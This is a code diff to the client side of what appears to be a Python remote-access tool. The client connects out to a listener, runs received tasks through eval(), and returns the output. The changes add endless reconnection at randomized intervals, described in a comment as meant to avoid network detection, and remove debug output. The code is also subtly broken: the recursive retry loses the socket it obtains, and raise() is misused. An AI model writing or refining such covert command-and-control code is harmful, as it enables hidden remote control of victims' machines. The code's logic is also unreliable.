@@ -4,6 +4,8 @@ import sys
 import subprocess as sp
 import os
 import sys
+from time import sleep
+from random import randint
 
 """
 A class to interact with the tor expert bundle.
@@ -38,18 +40,26 @@ A class to handle the client socket.
 """
 class ClientSocket:
     ENCODING = 'utf-8'
+    # timout in seconds between every connection try
+    CONNECTION_TIMEOUT = 30
 
     def __init__(self, remHost, remPort):
         self.remAddr = (remHost, remPort)
         self.__sock = self.createConnection()
 
     def createConnection(self):
+        """
+        Recursivly try to connect to the listener until it works,
+        then return socket object.
+        """
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect(self.remAddr)
         except socket.error as error:
-            print(str(error))
-            sys.exit(1)
+            # randomize connection timeout to avoid network detection
+            timeout = randint(self.CONNECTION_TIMEOUT - 10, self.CONNECTION_TIMEOUT + 10)
+            sleep(timeout)
+            self.createConnection()
         else:
             return sock
 
@@ -63,7 +73,7 @@ class ClientSocket:
             data = {'output' : output, 'cwd' : cwd}
             self.__sock.send(str(data).encode(self.ENCODING))
         except socket.error:
-            sys.exit(1)
+            raise()
 
     """
     The client receives a dictionary containing a task,
@@ -73,9 +83,14 @@ class ClientSocket:
         try:
             data = self.__sock.recv(numBytes)
             data = data.decode(self.ENCODING)
-            print(data)
             data = eval(data)
-        except socket.error as error:
-            sys.exit(1)
+        except socket.error:
+            raise()
         else:
             return data['task'], data['args']
+
+    def __del__(self):
+        try:
+            self.__sock.close()
+        except:
+            pass
